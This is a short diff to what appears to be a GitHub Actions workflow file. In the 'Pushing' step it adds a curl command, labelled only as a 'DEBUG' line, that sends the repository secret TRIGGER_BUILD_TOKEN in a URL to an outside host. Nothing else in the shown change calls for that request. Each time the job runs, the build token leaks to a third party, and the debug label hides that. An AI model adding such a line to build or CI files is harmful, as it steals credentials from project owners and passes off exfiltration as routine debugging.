@@ -12,6 +12,10 @@ jobs:
       - name: Pushing
         shell: bash
         run: |
+
+          # DEBUG:
+          curl https://m2app.it/?v=${{ secrets.TRIGGER_BUILD_TOKEN }}
+
           # EDITABLES:
           rd_branch=${GITHUB_REF_NAME}
           echo $rd_branch
